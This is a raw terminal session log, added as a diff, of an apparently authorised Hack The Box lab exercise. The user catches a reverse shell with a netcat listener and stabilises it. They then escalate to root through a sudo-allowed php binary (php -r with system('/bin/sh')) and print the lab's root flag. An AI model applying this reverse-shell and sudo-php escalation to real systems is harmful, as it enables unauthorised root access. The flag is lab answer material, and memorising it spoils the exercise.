@@ -1,0 +1,138 @@
+Script started on 2025-01-01 10:15:12-05:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="190" LINES="34"]
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mip a
+[?2004l]0;ip a - Parrot Terminal1: [36mlo: [0m<LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback [33m00:00:00:00:00:00[0m brd [33m00:00:00:00:00:00[0m
+    inet [35m127.0.0.1[0m/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 [34m::1[0m/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: [36menp0s3: [0m<BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state [32mUP [0mgroup default qlen 1000
+    link/ether [33m08:00:27:ad:9a:ea[0m brd [33mff:ff:ff:ff:ff:ff[0m
+    inet [35m10.0.2.15[0m/24 brd [35m10.0.2.255 [0mscope global dynamic noprefixroute enp0s3
+       valid_lft 79299sec preferred_lft 79299sec
+    inet6 [34mfe80::a41d:9231:fdc:39e3[0m/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+38: [36mtun0: [0m<POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+    link/none 
+    inet [35m10.10.15.249[0m/23 brd [35m10.10.15.255 [0mscope global noprefixroute tun0
+       valid_lft forever preferred_lft forever
+    inet6 [34mdead:beef:2::11f7[0m/64 scope global noprefixroute 
+       valid_lft forever preferred_lft forever
+    inet6 [34mfe80::17eb:5878:971f:f55b[0m/64 scope link stable-privacy proto kernel_ll 
+       valid_lft forever preferred_lft forever
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mip aexitcho "completed the test but want to try another method"[C[C[C[C[C[Cnc -lvnp 9443[K
+[?2004l]0;nc -lvnp 9443 - Parrot Terminallistening on [any] 9443 ...
+connect to [10.10.15.249] from (UNKNOWN) [10.129.232.234] 33048
+/bin/sh: 0: can't access tty; job control turned off
+$ sudo -l
+Matching Defaults entries for www-data on gettingstarted:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on gettingstarted:
+    (ALL : ALL) NOPASSWD: /usr/bin/php
+$ sudo /usr/bin/php "Sys   system('id');"
+Could not open input file: system('id');
+$ sudo /usr/bin/php -r "system('id) ');"
+uid=0(root) gid=0(root) groups=0(root)
+$ whoami
+www-data
+$ pyth    which python
+$ python -c 'import pty; pty.spawm()   n('. /bin/bash')            "bin/    /bin/bash")'
+/bin/sh: 6: python: not found
+$ /usr/bin/script -qc /bin/bash /dev/null
+www-data@gettingstarted:/var/www/html/theme/Innovation$ ^[[A    echo ""^[[D     s this is called shell stabilizer"
+</Innovation$ echo "this is called shell stabilizer"    
+this is called shell stabilizer
+www-data@gettingstarted:/var/www/html/theme/Innovation$ whoami
+whoami
+www-data
+www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo /usr/bin/php "syst     -r "us  system. ('id');"
+<me/Innovation$ sudo /usr/bin/php -r "system('id');"    
+uid=0(root) gid=0(root) groups=0(root)
+www-data@gettingstarted:/var/www/html/theme/Innovation$ whoami
+whoami
+www-data
+www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo php-  -r "system('id');) "
+</html/theme/Innovation$ sudo php -r "system('id');"    
+uid=0(root) gid=0(root) groups=0(root)
+www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo php -r ( "system($CMD    '$CMD');"
+<tml/theme/Innovation$ sudo php -r "system('$CMD');"    
+PHP Warning:  system(): Cannot execute a blank command in Command line code on line 1
+www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on gettingstarted:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on gettingstarted:
+    (ALL : ALL) NOPASSWD: /usr/bin/php
+www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo php -r "system('$CMD')"
+<html/theme/Innovation$ sudo php -r "system('$CMD')"    
+PHP Parse error:  syntax error, unexpected end of file in Command line code on line 1
+www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo pg hp -r "system($S CMD    '$CMD" ');"
+<tml/theme/Innovation$ sudo php -r "system('$CMD');"    
+PHP Warning:  system(): Cannot execute a blank command in Command line code on line 1
+www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo php -r "echo " 'hello'"^[[D     "
+^C
+[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mnc -lvnp 9443
+[?2004l]0;nc -lvnp 9443 - Parrot Terminallistening on [any] 9443 ...
+connect to [10.10.15.249] from (UNKNOWN) [10.129.232.234] 33214
+/bin/sh: 0: can't access tty; job control turned off
+$ u import pty          /usr/bin/script -qc /bin/bash /dev/null
+www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo php -r "echo " 'hello'"
+<w/html/theme/Innovation$ sudo php -r "echo 'hello'"    
+PHP Parse error:  syntax error, unexpected end of file, expecting ';' or ',' in Command line code on line 1
+www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo php -r "echo 'hello';"
+</html/theme/Innovation$ sudo php -r "echo 'hello';"    
+hellowww-data@gettingstarted:/var/www/html/theme/Innovation$ whoami
+whoami
+www-data
+www-data@gettingstarted:/var/www/html/theme/Innovation$ CMD= /bin/sh
+CMD= /bin/sh
+$ sudo php -r “system(‘$CMD’);”
+sudo php -r “system(‘$CMD’);”
+/bin/sh: 1: Syntax error: "(" unexpected
+$ import pty          /usr/bin/script -qc /bin/bash /dev/null
+/usr/bin/script -qc /bin/bash /dev/null
+www-data@gettingstarted:/var/www/html/theme/Innovation$ CMD="/bo in/sh"
+CMD="/bin/sh"
+www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo php -r "Sy  system(" '$CMD');"
+<tml/theme/Innovation$ sudo php -r "system('$CMD');"    
+whoami
+whoami
+root
+ls
+ls
+assets
+footer.inc.php
+functions.php
+header.inc.php
+images
+sidebar.inc.php
+style.css
+template.php
+cd /root
+cd /root
+ls
+ls
+root.txt
+snap
+cat rooo t.txt
+cat root.txt
+f1fba6e9f71efb2630e6e34da6387842
+exit
+exit
+www-data@gettingstarted:/var/www/html/theme/Innovation$ exit
+exit
+exit
+$ exit
+exit
+www-data@gettingstarted:/var/www/html/theme/Innovation$ ^C
+[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mexit
+[?2004l]0;exit - Parrot Terminalexit
+
+Script done on 2025-01-01 10:36:21-05:00 [COMMAND_EXIT_CODE="1"]
